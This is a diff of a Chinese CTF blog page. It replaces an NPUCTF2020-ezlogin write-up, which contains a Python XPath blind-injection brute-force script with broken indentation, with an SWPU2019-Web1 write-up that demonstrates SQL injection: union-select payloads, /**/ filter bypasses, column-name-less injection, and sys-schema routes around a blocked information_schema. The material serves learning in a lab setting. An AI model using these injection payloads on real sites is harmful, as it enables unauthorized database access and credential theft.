@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="NPUCTF2020-ezlogin, Hexo">
+    <meta name="keywords" content="SWPU2019-Web1, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>NPUCTF2020-ezlogin | Hexo</title>
+    <title>SWPU2019-Web1 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">NPUCTF2020-ezlogin</h1>
+                    <h1 class="description center-align post-title">SWPU2019-Web1</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-14
+                    2021-05-17
                 </div>
                 
 
@@ -464,67 +464,82 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>#前言</p>
+                <p>#写在前面</p>
+<p>这道题虽然没有做出来，但是我找到了注入点，我不再是从前哪个哪个类型的题目都不知道的小垃圾的。但是。。。因为知识储备的太少，我依然没有做出来</p>
 <a id="more"></a>
 
-<p>打开题目，又是一道登录界面的题目，但是尝试扫描目录什么都没有，抓包后发现，<username>1</username><password>1</password><token>da1e1b4e62b5a2f21dbe9bTYyMTAwMzM</token>很奇怪，看WP发现是xpath盲注</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7791">关于xpath</a></p>
-<p>采用大佬脚本爆破</p>
-<pre><code>    import requests
-    import re
+<h2>前置知识</h2>
 
-    s = requests.session()
-    url =&#39;http://47e7790f-8a53-4efa-988b-7a350ebb91d5.node3.buuoj.cn//login.php&#39;
-
-
-
-head =&#123;
-&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;,
-&quot;Content-Type&quot;: &quot;application/xml&quot;
-&#125;
-find =re.compile(&#39;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#39;)
-
-strs =&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;
-
-
-flag =&#39;&#39;
-for i in range(1,100):
-    for j in strs:
-
-    r = s.post(url=url)
-    token = find.findall(r.text)
-    #猜测根节点名称
-    payload_1 = &quot;&lt;username&gt;&#39;or substring(name(/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])
-    #猜测子节点名称
-    payload_2 = &quot;&lt;username&gt;&#39;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])
-
-    #猜测accounts的节点
-    payload_3 =&quot;&lt;username&gt;&#39;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])
-
-    #猜测user节点
-    payload_4 =&quot;&lt;username&gt;&#39;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])
-
-    #跑用户名和密码
-    payload_username =&quot;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])
-
-    payload_password =&quot;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])
-
-
-    print(payload_password)
-    r = s.post(url=url,headers=head,data=payload_username)
-    print(r.text)
-
-
-    if &quot;非法操作&quot; in r.text:
-        flag+=j
-        print(flag)
-        break
-
-if &quot;用户名或密码错误!&quot; in r.text:
-    break
-
-print(flag)</code></pre>
-<p>得到密码，用户名，然后根据base64读取flag，注意大小写绕过</p>
+<blockquote>
+<p>group by</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12590172.html">order by希望学习一下</a></p>
+<p>在做这道题目的时候，我fuzz发现#被过滤，我就想说这要怎么进行注释，然后我特别啥的试了下%23，哇偶，它没有被过滤。。。。。其实这个不是url<br>不会进行url解码，所以这个%23，是没有任何作用的，所以我学到了一种新的方法：</p>
+<p>1’,xxx,’1,在输入一个数据将其闭合</p>
+<p>其实我学sql以来，在爆库的时候就学了两种方法，通过联合查询，另外就是报错注入，堆叠注入也算是一种把。但是我内心不知道为啥总是比较抵触联合查询，因为联合查询第一点就是要进行看有几个字段嘛，我因为不是特别理解 order by跟group by，所以总是不喜欢用这个，另外内心觉得这个很简单（因为我入门的时候，第一个接触的就是这个，所以就感觉不会用到，但是这是大错特错！！！！）</p>
+<p><img src="1.PNG"></p>
+<p>先看下order by，我理解了什么意思，就是如果我们输入1’ order by 4 ,’1</p>
+<p>那我们输入的其实是select * from ‘1’ order by 3,’1’</p>
+<p><img src="2.PNG"></p>
+<p>我们可以看一下字符型和数字性的，如果是图中的第一个就是按照第几列的某中顺序进行排列，那么我们就可以从1输到一个任意指导出现报错的输就代表我们成功了</p>
+<p>group by在我理解来就是去除了你要的哪一列的重复项</p>
+<p><img src="3.PNG"></p>
+<p><img src="4.PNG"></p>
+<p>然后我们就可以用这两个函数来去fuzz有几个字段。</p>
+<p><img src="5.PNG"></p>
+<p>回到我们题目上，因为如果输入空格，比如show databases;它会自动变成showdatabases；就会出错，所以我们用/**/来进行过滤，然后因为order by被过滤所以我们只能使用group by。</p>
+<p>但是这道题最坑的是它竟然有22个字段，这谁能想到啊啊啊啊啊啊，所以写给我提了个醒，如果以后要进行fuzz字段，我就可以直接搞个大的，在一二分的方式进行，太坑了。。。。</p>
+<p>然后我需要知道，这22个字段里谁的东西会显示在广告名或广告内容上。</p>
+<p>因为我之前用这个方法的次数很好，我竟然不知道联合查询的步骤，我把这个和fuzz字段弄混在一起了</p>
+<p>1’/<strong>/union/</strong>/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
+<p><img src="8.PNG"></p>
+<p>因为我们不是知道有22个字符嘛，然后我们进行联合查找，然后送图中可以看到我们的1，2，3，4，5，6，7，8另其了一行。</p>
+<p>其实我们通过这个可以知道广告名，广告内容它们所在的字段的位置，一位哦毕竟我们想要flag，22个字段的内容必然不会全部显示在屏幕上，所以通过这个测试我们就可以知道两个字段里有我们想要的东西。</p>
+<p><img src="9.PNG"></p>
+<p>1’/<strong>/union/</strong>/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
+<p><img src="10.PNG"></p>
+<p>成功得到了库名，但是其实做了一些ctf题目后，我有发现其实库名要不要无所谓，因为我们想要得到表名，我们可以使用where table_schema=database();来获取表明，但是这道题目emmmm，information_schema被过滤了</p>
+<p>所以我们就进行关于information_schema的过滤<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">bypass</a>，</p>
+<p>但是由于buu上环境的问题所以就不能进行所以看WP，就盲猜在users表中</p>
+<p>然后嘛就是因为毕竟information被过滤，我们只能通过无列名注入得到我们的想要的</p>
+<p>1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>4</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3,4,5,6/</strong>/union/<strong>/select/</strong>/*/<strong>/from/</strong>/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
+<p>然后这里就又学到了一个新的知识，无列名注入，顾名思义就是我们不知道字段的名字，但是我们还想要拿到字段的信息</p>
+<p><img src="9.PNG"></p>
+<p>在这里我们可以看到一共有8个字段，但是如果我们不知道字段的名字，我们应该怎么做呢</p>
+<p><img src="10.PNG"></p>
+<p>我们可以看到每个列的名字都被相应的数字覆盖了</p>
+<p><img src="11.PNG"></p>
+<p>可以看到当我重新构造了一个表a的时候，我可以单独把每一个字段里的内容都重新列了出来，所以现在我们就可以不通过字段名进行注入了。</p>
+<p>但是如果反引号被过滤了，那我们该怎么办呢？</p>
+<p><img src="12.PNG"></p>
+<p>如果反引号被过滤了可以这样子搞</p>
+<p>然后</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>3</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select/</strong>/*/<strong>/from/</strong>/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p>
+</blockquote>
+<p>然后我们通过注入得到flag，但是注意表users中的字段也是需要一步一步测出来的。</p>
+<p><img src="13.PNG"></p>
+<p>好嘞，到最后在去了解一下如果information_schema被过滤了应该怎么办吧</p>
+<p>其实为什么information——schema很重要就是我们在注入的时候要通过它来进行爆库，爆表包字段，然后一旦它被禁用就好像我们失去了一个超级有利的武器</p>
+<blockquote>
+<p>sys.schema_auto_increment_columns</p>
+</blockquote>
+<p>其实我们在设计表的时候一旦都会涉及一个id的字段，里面的id就是从0开始进行添加</p>
+<p>而schema_auto_increment_columns，该视图的作用简单来说就是对表自增id的监控</p>
+<blockquote>
+<p>sys.schema_auto_increment_columns</p>
+</blockquote>
+<p>但是有的情况下因为有些就是没有id，我们可以用sys.schema_table_statistics_with_buffer绕过</p>
+<p>payload:</p>
+<blockquote>
+<p>?id=-1’ union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()–+</p>
+</blockquote>
+<blockquote>
+<p>?id=-1’ union all select*from (select * from users as a join users b)c–+</p>
+</blockquote>
+<blockquote>
+<p>?id=-1’ union all select*from (select * from users as a join users b using(id,username))c–+</p>
+</blockquote>
 
                 
             </div>
@@ -551,7 +566,7 @@ print(flag)</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ckylsy.github.io/2021/05/14/NPUCTF2020-ezlogin/">http://ckylsy.github.io/2021/05/14/NPUCTF2020-ezlogin/</a>
+                    <a href="http://ckylsy.github.io/2021/05/17/SWPU2019-Web1/">http://ckylsy.github.io/2021/05/17/SWPU2019-Web1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -758,9 +773,10 @@ print(flag)</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/05/17/SWPU2019-Web1/">
                     <div class="card-image">
@@ -779,9 +795,9 @@ print(flag)</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -790,6 +806,7 @@ print(flag)</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -800,24 +817,24 @@ print(flag)</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/13/ctfshow-misc/">
+                <a href="/2021/05/14/NPUCTF2020-ezlogin/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="ctfshow-misc">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="NPUCTF2020-ezlogin">
                         
-                        <span class="card-title">ctfshow-misc</span>
+                        <span class="card-title">NPUCTF2020-ezlogin</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            #前言菜鸡web狗，也想学misc,题目上有句话，每道题你都要想一想flag藏在哪里，为什么要藏在这里
+                            #前言
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-14
                             </span>
                         <span class="publish-author">
                             
